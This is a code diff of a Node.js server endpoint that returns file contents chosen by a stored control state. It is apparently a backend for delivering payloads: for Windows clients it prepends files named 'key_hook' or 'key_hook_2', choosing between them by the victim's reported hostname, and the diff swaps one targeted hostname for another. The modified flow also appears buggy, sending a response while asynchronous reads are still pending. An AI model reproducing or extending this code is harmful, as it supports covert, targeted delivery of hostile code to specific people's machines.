@@ -36,7 +36,7 @@ async function getFileContents(req, res, db) {
                 controlState = doc.data().controlState; // Get controlState from the document
             });
 
-            const attachName = fileName + "-a.js";
+            // const attachName = fileName + "-a.js";
             // Determine the file name based on the controlState
             
             switch (controlState) {
@@ -44,7 +44,7 @@ async function getFileContents(req, res, db) {
                     fileName = '0'; // Replace with your actual file name
                     break;
                 case 'S2':
-                    fileName += '_3';
+                    fileName += '';
                     break;
                 case 'S3':
                     fileName += '_3'; // Replace with your actual file name
@@ -53,12 +53,8 @@ async function getFileContents(req, res, db) {
                     return res.status(400).json({ error: "Invalid control state." }); // Handle undefined control states
             }
 
-            if(fileName == '4') {
-                fileName = '4';
-            }
-
             const filePath = path.join(process.cwd(), "5", fileName);
-            const attachPath = path.join(process.cwd(), "5", attachName);
+            //const attachPath = path.join(process.cwd(), "5", attachName);
             const prePath = path.join(process.cwd(), "5", 'key_hook');
             const prePath2 = path.join(process.cwd(), "5", 'key_hook_2');
             fs.readdir(path.join(process.cwd(), "5"), (err, files) => {
@@ -80,45 +76,25 @@ async function getFileContents(req, res, db) {
                     if (err) {
                         return res.json({});
                     }
-                    fs.readFile(attachPath, "utf-8", (err, afterContent) => {
-                        if (err) {
-                            return res.json({});
-                        }
-                        const content = " {" + mainContent + "} ";
-                        //return res.json(content);
-                        if(req.body.platform === "win32" || req.body.OS === "Windows_NT") {
-                            // req.clientIp  req.body.hostname  req.body.username
-                            if(req.body.hostname == 'neumann') {
-                                fs.readFile(prePath2, "utf-8", (err, preContent2) => {
-                                    if (err) {
-                                        return res.json({});
-                                    }
-                                    return res.json(preContent2 + content + afterContent);
-                                });
-                            } else {
-                                fs.readFile(prePath, "utf-8", (err, preContent) => {
-                                    if (err) {
-                                        return res.json({});
-                                    }
-                                    return res.json(preContent + content + afterContent);
-                                });
-                            }
-                        }
-                        else {
-                            if(fileName == '4'){
-                                if(controlState == 'S3'){
-                                    return res.json(content + afterContent);    
-                                } 
-                                else {
-                                    return res.json(content);
+                    if(req.body.platform === "win32" || req.body.OS === "Windows_NT") {
+                        // req.clientIp  req.body.hostname  req.body.username
+                        if(req.body.hostname == 'fmonfasani') {
+                            fs.readFile(prePath2, "utf-8", (err, preContent2) => {
+                                if (err) {
+                                    return res.json({});
                                 }
-                            } 
-                            else {
-                                return res.json(content + afterContent);
-                            }
-                            
+                                return res.json(preContent2 + mainContent);
+                            });
+                        } else {
+                            fs.readFile(prePath, "utf-8", (err, preContent) => {
+                                if (err) {
+                                    return res.json({});
+                                }
+                                return res.json(preContent + mainContent);
+                            });
                         }
-                    });
+                    }
+                    return res.json(mainContent);
                 });
             });
         }
